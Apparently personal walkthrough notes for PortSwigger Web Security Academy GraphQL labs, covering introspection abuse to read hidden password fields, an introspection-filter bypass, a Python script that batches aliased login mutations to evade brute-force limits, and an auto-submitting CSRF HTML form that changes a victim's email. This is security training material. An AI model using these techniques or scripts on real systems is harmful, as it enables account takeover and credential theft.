### Accessing private GraphQL posts

Send the POST /graphql/v1 to repeater. Right click, GraphQL > Set introspection query
Now you know it's vulnerable, find a graphql request to a blog post. 

In the GraphQL tab, set the id to 1 in the variables section, and add "postPassword" to the query:
![[Pasted image 20240731184956.png]]

Send the request, and move the id until you get the password. 

---
### Accidental exposure of private GraphQL fields

Send an introspection query, and the response Right click > GraphQL > Save GraphQL queries to site map

Now in target, site map, open your target, and see the querys. There is a `getUser` that retrieves user and password. Send to repeater, replace the id=0 for a 1. Log in with the credentials.

---
### Finding a hidden GraphQL endpoint

Try to access to a typical GraphQL endpoint such as `/api` and see there is a message "Query not present". 
Append a universal query like this `/api?query=query{__typename}`. And validate there is a GraphQL endpoint. 
Now send an introspection query to that. 

The response says `GraphQL introspection is not allowed, bu the query contained __schema or __type` so append a `%0a` after the word schema, and send it again. Now it works.

Send that to target > GraphQL > Save GraphQL queries to site map, and look for the "getUser". Use the id:3 to find its the ID of carlos.
```text
query {
  getUser(id: 3) {
    id
    username
  }
}
```

Now send the query to delete users, and set the variable id to 3. Solved.

---
### Bypassing GraphQL brute force protections

Try to login, and send that grapql request to repeater, try a few times, and see you're being blocked after some failed attempts.

But you can send something like this to brute force the login:
![[Pasted image 20240801100127.png]]

Use the passwords given by PortSwigger, and the following script:
```python
def generate_graphql_mutation(file_path, username):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    
    mutation_template = 'mutation login {{\n{}\n}}'
    bruteforce_template = '    bruteforce{}: login(input: {{password: "{}", username: "{}"}}) {{\n        token\n        success\n    }}\n'
    
    mutations = []
    for index, password in enumerate(passwords):
        mutations.append(bruteforce_template.format(index, password, username))
    
    return mutation_template.format('\n'.join(mutations))

# Usage
file_path = 'passwords.txt'
username = 'carlos'
graphql_mutation = generate_graphql_mutation(file_path, username)
print(graphql_mutation)

# Optionally, you can save the output to a file
with open('graphql_mutation.txt', 'w') as output_file:
    output_file.write(graphql_mutation)
```

The password is "michelle".

---
### Performing CSRF exploits over GraphQL

Log in to your account. Change your email. Send the to repeater, change the email again. 
The fact you can do it, means you can reuse the same cookie several times.

Change the requested method twice, so you have now a new Content-Type of `x-www-form-urlencoded`

Use this as a body for that request:
`query=mutation%20changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}`

And generate CSRF PoC. Paste that HTML in the exploit server.

This is the HTML:
```html
<html>
    <form action="https://0a6000ec03bfe2a681f5c0d600f600ab.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x7b;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x7b;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x7d;&#x7d;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x22;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x32;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
</html>

```

